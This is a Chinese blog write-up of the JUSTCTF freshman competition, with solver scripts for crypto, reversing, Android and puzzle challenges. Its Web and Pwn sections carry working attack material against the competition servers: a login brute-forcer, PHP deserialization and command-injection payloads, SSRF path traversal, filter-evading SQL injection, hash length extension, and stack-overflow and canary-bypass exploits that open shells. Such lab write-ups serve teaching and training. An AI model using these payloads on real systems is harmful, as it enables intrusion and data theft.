---
title: "JUSTCTF 新生杯Write Up"
date: 2020-12-10T09:48:08+08:00
tags:["CTF"]
categories:["CTF"]
---


# JUSTCTF 新生杯 Write Up

[TOC]

## Misc

### Easy SignIn

题目给出二维码，扫描二维码即可获得Flag

### Can you see me ?

打开文档为空，全选发现隐藏东西，根据长度判断可能为二进制。

```python
with open("can_you_see_me.txt") as f:
    str = f.readlines()
k = ''

for i in str:
    if len(i)==17:
        k+='0'
    elif len(i)==33:
        k+='1'
#注意一个字符长度为32
print(k)
print(len(k))
```

### 抽象带师

利用搜索引擎，搜索 emoji密码

https://emojicipher.com/zh-CN

### PUZZLE

题目给出 240张图片  拼接

```shell
 identify JUST_ZSZZ.jpg  #查看图片尺寸 58 * 58
```

```shell
montage JUST*.jpg -tile 20x12  -geometry +0+0 a.png #合成图片
```

```shell
gaps --image=a.png --size=58 --save  #自动拼图
```

### CTFER‘S 冒险之旅

RMV存档通用修改器

JUST{rpgg@me_is_s0_fun}

开挂玩游戏

### 抽象带带带师

所有emoji网站：

>1. https://codemoji.miaotony.xyz/
>2. base 100 : http://www.atoolbox.net/Tool.php?Id=936 (校园网打开不可描述)
>3. https://aghorler.github.io/emoji-aes/#decrypt   aes
>4. https://emojicipher.com/

key1: emojicipher

key2: base100 ， 一直没找到这个网站， 以为是 codemoji 

接下来就顺其自然

## Crypto

### Crypto Sign In

下载附件，yanwenzi.txt  百度搜索 颜文字解码

### So easy

下载附件，解压文件，在加密脚本里面看到flag，JUST里面逆序提交

### Basic and advanced

搜索 le chiffre indéchiffrable， 发现为维吉尼亚密码，经过尝试密钥为 crypto，

解密后发现 JUST 后 字符有问题， 用凯撒密码尝试， 出flag

### LLL

经过百度搜索 发现为 背包加密 https://github.com/ctfs/write-ups-2014/tree/b02bcbb2737907dd0aa39c5d4df1d1e270958f54/asis-ctf-quals-2014/archaic

下载 sage ，附上代码

执行的时候 sage xxx.py

最后将 十六进制转字符串

```python
import binascii
from sage.all import *
# open the public key and strip the spaces so we have a decent array
fileKey = open("easy_task/public.key", 'rb')
pubKey = fileKey.read().decode().replace(' ', '').replace('L', '').strip('[]').split(',')
nbit = len(pubKey)
# open the encoded message
fileEnc = open("easy_task/enc.enc", 'rb')
encoded = fileEnc.read().decode().replace('L', '')
print("start")
# create a large matrix of 0's (dimensions are public key length +1)
A = Matrix(ZZ, nbit + 1, nbit + 1)
# fill in the identity matrix
for i in xrange(nbit):
    A[i, i] = 1
# replace the bottom row with your public key
for i in xrange(nbit):
    A[i, nbit] = pubKey[i]
# last element is the encoded message
A[nbit, nbit] = -int(encoded)

res = A.LLL()
for i in range(0, nbit + 1):
    # print solution
    M = res.row(i).list()
    flag = True
    for m in M:
        if m != 0 and m != 1:
            flag = False
            break
    if flag:
        print (i, M)
        M = ''.join(str(j) for j in M)
        # remove the last bit
        M = M[:-1]
        M = hex(int(M, 2))[2:-1]
        print (M)
```

### Baby Rsa

根据题目给出部分  yafu、离散

根据 $a^b modx=(amodx)^b modx$

得出  $x^2modn=y$  $x^3modn=z$

求GCD得出 N ， 通过http://factordb.com/ 分解得到 p、q

根据离散数对，得出最终解 U_RSA_G0od

```python
from sympy.ntheory import discrete_log
from Crypto.Util.number import *
import gmpy2
c = 549255654365864476196144
x = 153618743392211321669273
y = 294470439622467776032293
z = 396326281365084844903098


#n = GCD(x**2-y, x**3-z)
#print(n)
# 550891582005727412022619

#p:  722402380069
#q:  762582733951

n = 550891582005727412022619
p = 722402380069
q = 762582733951

e=discrete_log(n,x,3)
d=gmpy2.invert(e,(p-1)*(q-1))
print(long_to_bytes(gmpy2.powmod(c,d,n)))
```

### Big Gift

读取n分钟 读取到 n 和 e ， 发现n非常大，e=65537, 即用其他方法求n

```python
import Crypto.PublicKey.RSA as RSA
import gmpy2
import libnum


e = 65537

with open("flag.enc", "rb") as f:
   cipher = f.read()

c = int.from_bytes(cipher, byteorder = 'little')
m = int(gmpy2.iroot(c,e)[0])
print(m)
print(libnum.n2s(m))
print(libnum.n2s(m)[::-1])
```

参考博客：https://blog.csdn.net/pytandfa/article/details/78741339

​					https://blog.csdn.net/zippo1234/article/details/109287550#2_68



### Drunk laffey

根据题意，94位01为摩斯密码，那么最主要的就是找到摩斯密码的间隔。

根据 hint，二进制转换为10进制，每位十进制加起来，正好等于94，附上转换代码

```python
a='101011101111010100101101011010110001101111111100010011001000110011001100110001101110000110001101101'
print(len(a))
str = ''
for i in range(len(a)):
    if a[i] =='1':
        str +='.'
    else:
        str +='-'
print(str)
```

## Re

### Re Without Hand

下载附件，用idaq打开，搜索字符串，即得到 flag

### pyc

根据提示，uncompyle6库 反编译pyc文件，写python脚本

```python
c = ''
for k in 'RMKLcwsGawmGyj}Glmj}G{l~}j999e':
    c += chr(ord(k) ^ 24)
print(c)
```

### md5

得到 come_on.pyc   反编译pyc文件，写脚本如下

```python
#0x937b8b318c569000
#0xb9ed7cb8a2f0b800
#0xe29cc9171a49d80     加个0
#0xa99e9ee21f22d800
md5s = [10627240790634959347, 13397501598946605822, 1020571715625065903, 12222381132752278743]
hexx = []
for i in md5s:
    print(hex(i))
    hexx.append(hex(i))
print(hexx)
# JUST{you_are_right_}
```

### maze

ida反编译，shift+f12看到特殊字符串，猜测为 迷宫，根据主函数，每二十为一行，跑一遍

>```python
>I__********___******
>**_********_*_******
>**_********_*_******
>___********_*__*****
>_**********_**_*****
>________***_**___***
>*******_____****__**
>*****************E**
>```

```python
import random
k = 0
t = 'I__********___********_********_*_********_********_*_******___********_*__*****_**********_**_*****________***_**___**********_____****__*******************E**'
for i in range(0,len(t),20):
    print(t[i:i+20])
for i in 'ddsssaassdddddddsddddwwwwwwddsssdssddsds':
    if ord(i)==100:  #
        k += 1
    elif ord(i) > 100:
        if ord(i) == 115:
            k+=20
        elif ord(i) == 119:
            k-=20
    elif ord(i) == 97:
        k-=1

print(k)
print(t[(20 * int(k / 20)) + k % 20]) 
```

### upx

直接工具脱壳，然后查看脱壳程序

```python
a = 'KWPP~uoigkTutj|103na'
str1= ''
for i in range(len(a)):
    str1 += chr(ord(a[i])^ (i+1))

print(str1)
```

### rand

ida出来，根据反汇编，写C++程序，直接出

```C++
#include<iostream>

using namespace std;
char v5;
char c[] = "_XEXvNzcuAX`N_{hnQ|mb9u";
int main(void){
	int v3;
	for (int i =0;i<=22;i++){
		v3 = rand();
		 *(&v5 + i) = v3 - 26 * (((signed int)((unsigned __int64)(1321528399LL * v3) >> 32) >> 3) - (v3 >> 31));
		 *(&v5 + i) = c[i] ^ (*(&v5 + i) + 6);
		 cout<<*(&v5 + i);
	}
	
	
	return 0;
	
} 
```



### Flag Game

```

a1 = 'NPVQIWcZRMQLZ]KWZVAAIVZCKK@#z'


str = ''   #28 
# 1. v2 输入: str[ord('str[0]') - 12])!=0 , v17 = len(str)
# 2. v4 不能有回车                          a2 = 29
# 3. for (i =0; 28+1 > i; ++i)
#        v10[i] = str[i] ^ (str[i]>>4)          !str[i] >> 4  == str[i+1]
# 4. v10[len(str)] == v[17] && a2 - 1 == len(str)


#  v10[28] = z
for i in a1:
    for j in range(137):
        if j^ (j>>4) == ord(i):
            str += chr(j)
print(str)      
#JUSTMRe_WITH_XOR_SEEMS_GOOD!}
出来结果稍微有些不对劲，略微改一改。
```

### Re最终考核题 (Reverse Final Test)

最重要的function2， 取余，设常数`j`，然后从里面调一个

```python
from sympy import *

def function2(s):
    sa = s
    if (s<=64) or (s>90):
        if (s>96 and s<=122):
            sa = ((s^0x20)-60)%26 +65
    else:
        sa = ((s^0x20)-92)%26 +97
    return sa
def function3(flag,s):
    return s == flag
def function1(flag):
    l = 0
    j = 0
    h = 0
    m = 0
    for i in range(51):
        flag[i] ^= i + 1
    while (l<=50):
        flag[l] = function2(flag[l])
        l+=1
    while h<=50:
        if function3(flag[h],s[h]):
            m+=1
        h+=1
    return h
def main1(flag):
    pass
'''
    while (j <= 50 and function3(flag[j],s[j])):
        h+=1
        j+=1
'''
    
s=[87, 81, 75, 65, 86, 125, 116, 76, 126, 122, 91, 60, 69, 61, 125, 97, 127, 94, 113, 114, 69, 104, 109, 68, 80, 95, 105, 106, 45,102, 68, 110, 116, 107, 124, 85, 114, 116, 121, 66, 70,104, 116, 109, 109,96, 85, 127, 73, 107, 115]
str1 = ''
for i in s:
    str1 += chr(i)
print(str1)
#1. 先对flag每一个值进行 与 i+1异或，然后想加
#2. flag的每一个值， flag[i]
#          if flag[i] <=64 || flag[i]>90:
#                if  96< flag[i]<122
#                       flag[i] = ((flag[i]^0x20) - 60) %26+ 65
#          else:
#                flag[i] = ((flag[i]^0x20) - 92) % 26 + 97
#3. 对于flag的每一个值与s相比，相等加一， 最后值等于 flag[i] 中 0第一次出现的位置
tmp = 0
str2 = []

for i in range(len(s)):
    for j in range(5):
        tmp = (((s[i] - 65) + j * 26) + 60)^ 0x20
        tmp2 = (((s[i] - 97) + j * 26) + 92)^ 0x20
        if (tmp <= 64) or (tmp > 90):
            if (tmp > 96) and (tmp<=122):
                if (s[i] == ((tmp^0x20)-60)%26+65):
                    str2.append((i,j,chr(tmp)))
                    break
        else:
            if (s[i] == ((tmp2^0x20)-92)%26+97):
                str2.append((i,j,chr(tmp)))
                break
            str2.append((i,j,chr(s[i])))
        #str2.append((i,j,chr(s[i])))
'''
        if (s[i] == ((tmp2^0x20)-92)%26+97):
                    print(tmp)  
                    str2.append((i,j,chr(tmp)))
                    break
        
        else:
            str2.append((i,j,chr(s[i])))

'''
#snert{How_P0H3rFnL_YPU_arE_Y0_find_This_HiddeN_OUt}
 
print(str2)
print(len(str2))
str3 = ''
str4 = ''
'''
for i in str2:
    str4 += i[2]
print(str4)
'''
for i in str2:
    str3 += chr(ord(i[2]) ^ ((i[0]+1)))

#for i in range(len(str2)):
#    str3 += chr(ord(str2[i][2]) ^ (i+1))
print(str3[:])
print(len(str3))
print(function1([ord(i) for i in str3]))
```

## Web

### Welcome

打开题目链接，f12 发现注释中有flag

### EZ_blast

根据index.php 的响应头发现 base64 编码, 解出来是 hint.php

访问 得到 password.txt

开始爆破

```python
import requests
url = 'http://120.79.25.56:30013/'


with open('password.txt') as f:
    str = f.readlines()
for i in range(len(str)-1,0, -1):
    for j in ['admin','Admin','username','']:
        data = {'username':j, 'password' : str[i].strip()}
        r = requests.post(url, data)
        print(data)
        print(r.text[:25])
        if not r.text[0:25]== "<script>alert('账号或密码错误');":
            print('成功',i)
            break
        else:
            if i%10 == 0:
                print(i)


```

JUST{bp_is_useful}

### EZ_pop

反序列化，百度搜索相关结构，构造payload

```python

import requests


url = 'http://106.75.214.10:9993/index.php'

order = 'system("cat /flag");'
num = len(order)

data = {'shana':'O:3:"Pop":2:{s:5:"shana";s:4:"yyds";s:3:"cmd";s:%d:"%s";};'%(num,order)}

#O:3:"Pop":2:{s:5:"shana";s:4:"yyds";s:3:"cmd";s:%d:"%s";};
# O:4:"data":2:{s:8:"username";s:5:"admin";s:8:"password";s:8:"password"};
#a:2:{s:8:"username";s:5:"admin";s:8:"password";s:8:"password";};
#a:2:{s:4:"tool";s:15:"php unserialize";s:6:"author";s:13:"w3cSchool.com";}
r = requests.get(url, data)

print(r.text)
```



### ez_ssrf

```php
<?php
echo'<center><strong>welc0me to JUSTCTF!!</strong></center>';
highlight_file(__FILE__);
$url = $_GET['url'];
if(preg_match('/justctf\.com/',$url)){
    if(!preg_match('/php|file|zip|bzip|zlib|base|data/i',$url)){
        $url=file_get_contents($url);
        echo($url);
    }else{
        echo('臭弟弟!!');
    }
}else{
    echo("就这？");
}
?>
```

其中`file_get_contents()`是关键，当目标请求时会判断使用的协议，如`http协议`这些，但如果是无法识别的协议就会当做目录，如`abc://`,进而造成目录穿越。
payload:`?url=abc://justctf.com/../../../../../flag`

JUST{ssrf_1s_s0_esay!}

### easy_php

```php
echo "欢迎来到JUSTctf,web没人做，只好送分了";    
show_source(__FILE__);
$username  = "admin";
$password  = "password";
include("flag.php");
$data = isset($_POST['data'])? $_POST['data']: "" ;
$data_unserialize = unserialize($data);
if ($data_unserialize['username']==$username&&$data_unserialize['password']==$password){
    echo $flag; 
}else{
    echo "送分题不要？爬吧";
}
```

首先尝试 {'data' : 'a:2:{s:8:"username";s:5:"admin";s:8:"password";s:8:"password";}'}

未知原因错误，不知道为什么。

然后 想到 == 弱类型，构造如下

a:2:{s:8:"username";b:1;s:8:"password";b:1;}

### EZ_Sql

![img](https://pic2.zhimg.com/v2-e8ae6979e1d8c5de73f6d9e11034d5fd_r.jpg)

1. 输入1' 报错， 确认有注入漏洞

2. 1' order by 2# ， 构造 `1%27/**/order/**/by/**/10;%00`

   得知：有十列
   
3. 1' union select database(),user()#  构造 `'/**/UnIon/**/sElEct/**/database(),user(),version(),@@version_compile_os,user(),user(),user(),user(),user(),user();%00`

   1. databae() : lastsward
   2. user():  root@localhost
   3. version():  10.2.26-MariaDB-log
   4. @@version_compile_os: Linux
   
4. ```mysql
   'uNion/**/seLect/**/table_names,table_schema/**/from/**/information_schema.tables/**/where/**/table_schema/**/=/**/'lastsward';%00 #select  十个
   group_concat(table_name)

   'uNion/**/seLect/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/=/**/'lastsward';%00
   ```
   
   得知  table_name : flag 、grade、users
   
5. ```mysql
   'uNion/**/seLect/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/'flag';%00
   ```

   得知 列名：flag、flag

6. ```
   'uNion/**/seLect/**/1,2,3,4,5,6,7,8,9,(sElect/**/flag/**/from/**/flag);%00
   ```

   拿到Flag： JUST{sq1_ls_1nt3r3stlng}
   
### Ez_upload

打开题目，发现又一个upload.php ，猜测上传漏洞，白名单 + 文件重命名。试过N长时间，发现行不通

看到题目给出file=upload.php，联想到ez_ssrf 解题， 直接`index.php?file=../../../../../flag`   

得到flag

### Crack_in

一直解不出来，一直在碰撞time()。。。。。

下午给出提示，hash类攻击

百度搜索相关资料，利用hashpump ， 根据

```shell
hashpump -s ae8b63d93b14eadd1adb347c9e26595a -d admin -k 25 -a pcat
```

Postman 传入参数，得到 flag

### Baby_php

1. 根据hint 和题目源码，首先构造通过Brup 构造cookie 即 访问 `http://101.36.122.23:7135/?username=admiN`  然后将cookie中 username=`YWRtaW4%3d   `,等号改为%3d

2. 进入下一环节，

   `http://101.36.122.23:7135/admmmmin.php?%6dd51=QNKCDZO&%6dd52=240610708&%6castsward&file=php://input`

   构造md5  url编码绕过

3. 最后一个环节， 执行 \$a , \$b,$c  百度搜索， system(commond,[..]) ， 执行命令找到flag

### EZ_Rec

开始.swp发现index的漏洞，根据vim -r 打开文件，发现源码，接下来就是构造一系列payload的过程

```python
import requests
import re
import base64
url = 'http://120.79.25.56:5599/index.php'


Headers ={
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'zh-CN,zh;q=0.9',
}
#$_POST["s'h'ana"}
#$_POST["s\hana"]
#$a=str_replace(x,'''',''axsxxsxexrxxt")$a($_POST['shezhang']);
# JF9QT1NUWydzaGFuYSdd | base64
#assert(phpinfo())
#base64.chr(95).deco\de("JF9QT1NUWydzaGFuYSddOzs7")
#c\\at /var/www/html/index.p\\hp > a.txt
#YT1gY2F0IGluZGV4LnBocGA7ZWNobyAkYSB8YmFzZTY0 | base64 -d|bas\h
#'system("echo YT1gY2F0IGluZGV4LnBocGA7ZWNobyAkYSB8YmFzZTY0 | base64 -d|bas\\h")?>'
#order = "find / -name flag;"
#order = str(base64.b64encode(order.encode('utf-8')),'utf-8')
#print(order)
#shana = 'system("echo '+order+'| base64 -d |bas\\h")?>'
#print(shana)
data ={'shana':"system('tail  /usr/src/flllaaag |base64')?>"}

    #print(data['shana'].find('JUST{',0))
r = requests.post(url, data = data, headers = Headers)
print(r.text[:1000])
```

### hex酱（未解）

1. 有题目得知 hex， 利用hex编码进行 沙箱逃逸
2. 被过滤字符：os|.|system|

```
a = 'cat flag.txt'

```

过滤. ， 利用 getattr()函数  `getattr(os, "system")("whoami")`

python 十六进制转hex

利用 `getattr(getattr("impo""rt","join")([chr(95),chr(95)]),"join")([chr(95),chr(95)])`

## Pwn

### test_your_nc

用nc连接，直接出flag

### 究极基础栈溢出

nc连接，查看提示，发现backdoor 地址， 以及已经填充esp， 只需pad0*14 字节

写个pwn， 进入 shell， 出 flag

```python
from pwn import *
io = 0
def isDebug(debug):
    global io
    if debug:
        io = process('t1')
    else:
        io = remote('101.36.122.23', 10000)

def pwn():
    payload = flat('A'* 0x10 , 0, 0x804851b)
    io.sendline(payload)
    io.interactive()
if __name__ == '__main__':
    isDebug(0)
    pwn()

```

### 基础栈溢出

ida查看源码，发现只要让 v1 = 841,然后 覆盖返回值，进入后门即可

1. s 和 v1 地址相差 8， 填充8个'a'，

2. 然后覆盖v1的值, p32(841)
3. s和返回值相差24 ，减去之前的12 ，再次填充12个 'a' 即可

flag{721eadea-8dc8-410a-943c-7e0558499773}

```shell
from pwn import *
io = 0
def isDebug(debug):
    global io
    if debug:
        io = process('t2')
    else:
        io = remote('101.36.122.23', 10002)

def pwn():   # shell : 0x804849B
    #payload = 'aaaaaaaa' + p64(841)
    
    payload = flat('a' * 8, p32(841),'a'*12,p32(0x0804849B))
    print(payload)
    print(len(payload))
    #io.send(payload)
    io.sendline(payload)
    io.interactive()
if __name__ == '__main__':
    isDebug(0)
    pwn()

```

### Canary

首先覆盖canary首位'\x00'，然后p.recv(3)，接着进入 vulu函数，进行变量覆盖，115和 37120 徒手推出

flag{869e5795-d09c-4ba1-abe1-168ecb551ef0}

```python
from pwn import *

p = remote('101.36.122.23', 10003)
context.log_level = 'debug'

payload = 'a' * 4 + 'b'
p.sendafter('[+]How to bypass canary?', payload)
p.recvuntil('b')
can = u32('\x00' + p.recv(3))

hack = 0x80485cb
payload  = 'a' * 4 + p32(0x73) + p32(0x9100) + p32(can) + p32(0) * 3
payload += p32(hack)
p.sendline(payload)

p.interactive()
```



## Algorithm

### 小汪钓鱼

根据题目要求，小汪钓鱼，写算法

最后一步 第一个人执行完，即输出

```python
from collections import deque

dog = deque()
cat = deque()
entir = []
for card in [6,5,4,3,2,1,8,7,5,2,3,5,6,9,8,2,1,4,6,2,7,8,8,6,5]:
    dog.append(card)
for card in [1,2,3,4,5,6,7,8,9,9,8,7,6,5,4,3,2,2,1,5,6,3,2,1,1]:
    cat.append(card)



def dog1():
    k = dog.popleft()
    entir.append(k)
    try:
        d = entir[:len(entir)-1].index(k)
    except:
        d = -1
    if d != -1:
        start = entir.index(k)
        dog.extend(list(reversed(entir[start:])))
        del entir[start:]
        return True
    return False
def cat1():
    m = cat.popleft()
    entir.append(m)   #放牌
    try:
        c = entir[:len(entir)-1].index(m)
    except:
        c = -1
    if c!=-1:
        start = entir.index(m)
        cat.extend(list(reversed(entir[start:])))
        del entir[start:]
        return True
    return False

while len(dog)!= 0 and len(cat) != 0:
    
    k = dog.popleft()
    entir.append(k)
    try:
        d = entir[:len(entir)-1].index(k)
    except:
        d = -1
    if d != -1:
        start = entir.index(k)
        dog.extend(list(reversed(entir[start:])))
        del entir[start:]
        
    print('dog\n',dog)
    print('cat\n',cat)
    print('tabel', entir)


    m = cat.popleft()
    entir.append(m)   #放牌
    try:
        c = entir[:len(entir)-1].index(m)
    except:
        c = -1
    if c!=-1:
        start = entir.index(m)
        cat.extend(list(reversed(entir[start:])))
        del entir[start:]



print(dog)
print(cat)
print(entir)
```

### 好家伙

>手推得出  如果最终个数为偶数时，两种情况 1)  abab...  ; 2) aaaaa...
>
>奇数时，仅可能位 aaaaa...

```python
with open('string.txt',"r") as f:
    str1 = f.read()
result= []
for i in range(10):
    for j in range(10):
        count = 0
        k = 0
        tmp =[0] * 2
        while k < len(str1):
            if str1[k] == str(i):
                count += 1  
                m = k + 1
                tmp[count % 2] = i
                if tmp[(count-1)%2] == tmp[count % 2]:
                    count -=1
                while m < len(str1):
                    if str1[m] == str(j):
                        count += 1
                        k = m
                        tmp[count % 2] = j
                        if tmp[(count-1)%2] == tmp[count % 2]:
                            count -=1
                        break
                    m += 1
                
            k += 1
        result.append((i,j,count))
print(result)
result1=[]
for i in result:
    if i[0] != i[1]:
        result1.append(i)
print(result1)
print('------------')
print(sorted(result1,key=lambda x:x[2]))
```

## Android

### 寻梦

下载文件，模拟器打开，根据提示，即出flag

### 寻梦S

下载apk，后缀改 zip， 解压，出 classes.dex，用dex2jar软件反编译为 jar

```shell
sh d2j-dex2jar.sh classes.dex
```

打开jd-gui工具，打开 classes.dex，找到 Mainactivity，

发现代码逻辑 写个python脚本，即出 flag

```python
array = [74,6,81,47,127,22,105,42,87,19,120,58,83,8,97,11,116,125]

奇数位直接与奇数异或
s = 'J#S#{#o#_#r#_#o#d##'
c = ''
for k in range(len(array)):
    if k % 2 !=0:
        c += chr( (ord(s[k+1])) ^ array[k])
    else:
        c += s[k]
print(c)


```

### 寻梦SS

首先根据Mainactivity给出的字符串，转换，隔一位交换。

然后 以为是base64（可在线转换），但是发现无法转换，即找到base64.encode函数

发现更改了字符表，换了之后，解密如下。

```python
'''
a = 'vtvhJb1CrO1SBAxTjB3CvO2Sv5zxn53gZLxTnF1xbI0tZZsB'
print(len(a))
c=[]
c.extend(a)
for i in range(len(a)-1,1,-1):
    tmp = c[i]
    c[i] = c[i-2]
    c[i-2] = tmp

result = ''.join(c)
print(result,len(result))
'''
#s = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', '0', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '/', '+', '='}
s = "abcdefghijklmnopqrstuvwxy0z123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ/+="
char_array_3 = {0, 0, 0}
char_array_4 = {61, 61, 61, 61}

def My_base64_decode(inputs):
	# 将字符串转化为2进制
	bin_str = []
	for i in inputs:
		if i != '=':
			x = str(bin(s.index(i))).replace('0b', '')
			bin_str.append('{:0>6}'.format(x))
	#print(bin_str)
	# 输出的字符串
	outputs = ""
	nums = inputs.count('=')
	while bin_str:
		temp_list = bin_str[:4]
		temp_str = "".join(temp_list)
		#print(temp_str)
		# 补足8位字节
		if(len(temp_str) % 8 != 0):
			temp_str = temp_str[0:-1 * nums * 2]
		# 将四个6字节的二进制转换为三个字符
		for i in range(0,int(len(temp_str) / 8)):
			outputs += chr(int(temp_str[i*8:(i+1)*8],2))
		bin_str = bin_str[4:]	
	print("Decrypted String:\n%s "%outputs)


My_base64_decode('sBvtvhJb1CrO1SBAxTjB3CvO2Sv5zxn53gZLxTnF1xbI0tZZ')

```



## NightShadowの面试题

### MD5 Challenge（1）

>听说MD5是什么很厉害的哈希算法，我才不相信呢！
>
>请制作一个能显示本文件md5的文件，附上制作过程

```python
import hashlib



if __name__ == '__main__':
    file_name = "md51.py"
    with open(file_name, 'rb') as fp:
        data = fp.read()
    file_md5= hashlib.md5(data).hexdigest()
    print(file_md5)


```

